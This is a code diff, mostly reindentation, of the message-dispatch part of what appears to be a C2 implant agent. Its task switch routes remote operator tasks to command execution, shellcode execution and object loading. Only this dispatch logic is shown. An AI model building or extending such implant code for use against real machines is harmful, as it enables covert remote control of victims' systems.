@@ -7,6 +7,7 @@ using namespace Parser;
 using namespace Network::Smb;
 using namespace Network::Http;
 using namespace Memory::Execute;
+using namespace Dispatcher;
 
 namespace Dispatcher {
 
@@ -65,30 +66,29 @@ namespace Dispatcher {
             : AddMessage(msg);
 
         /*
-        if (msg->length > MESSAGE_MAX) {
-            QueueSegments(B_PTR(msg->buffer), msg->length);
-        }
-        else {
-            AddMessage(msg);
-            // TODO: the re-packaging of messages seems unecessary
-            CreateParser(&parser, B_PTR(msg->buffer), msg->length);
+		  if (msg->length > MESSAGE_MAX) {
+		  QueueSegments(B_PTR(msg->buffer), msg->length);
+		  }
+		  else {
+		  AddMessage(msg);
+		  // TODO: the re-packaging of messages seems unecessary
+		  CreateParser(&parser, B_PTR(msg->buffer), msg->length);
 
-            queue            = CreateStream();
-            queue->peer_id   = __builtin_bswap32(UnpackUint32(&parser));
-            queue->task_id   = __builtin_bswap32(UnpackUint32(&parser));
-            queue->type      = __builtin_bswap32(UnpackUint32(&parser));
+		  queue            = CreateStream();
+		  queue->peer_id   = __builtin_bswap32(UnpackUint32(&parser));
+		  queue->task_id   = __builtin_bswap32(UnpackUint32(&parser));
+		  queue->type      = __builtin_bswap32(UnpackUint32(&parser));
 
-            queue->length    = parser.length;
-            queue->buffer    = B_PTR(Realloc(queue->buffer, queue->length));
+		  queue->length    = parser.length;
+		  queue->buffer    = B_PTR(Realloc(queue->buffer, queue->length));
 
-            MemCopy(queue->buffer, parser.buffer, queue->length);
-            AddMessage(queue);
+		  MemCopy(queue->buffer, parser.buffer, queue->length);
+		  AddMessage(queue);
 
-            DestroyParser(&parser);
-            DestroyStream(msg);
-             */
-        }
-    }
+		  DestroyParser(&parser);
+		  DestroyStream(msg);
+		*/
+	}
 
     VOID QueueSegments(uint8_t *buffer, uint32_t length) {
         HEXANE;
@@ -225,21 +225,21 @@ namespace Dispatcher {
         MemCopy(&ctx->session.current_taskid, &task_id, sizeof(uint32_t));
 
         switch (UnpackUint32(&parser)) {
-            case TypeCheckin:
-                MemSet(&ctx->session.checkin, true, sizeof(bool));
-                break;
-            case TypeTasking:
-                ExecuteCommand(parser);
-                break;
-            case TypeExecute:
-                ExecuteShellcode(parser);
-                break;
-            case TypeObject:
-                LoadObject(parser);
-                break;
+		case TypeCheckin:
+			MemSet(&ctx->session.checkin, true, sizeof(bool));
+			break;
+		case TypeTasking:
+			ExecuteCommand(parser);
+			break;
+		case TypeExecute:
+			ExecuteShellcode(parser);
+			break;
+		case TypeObject:
+			LoadObject(parser);
+			break;
 
-            default:
-                break;
+		default:
+			break;
         }
 
         DestroyParser(&parser);
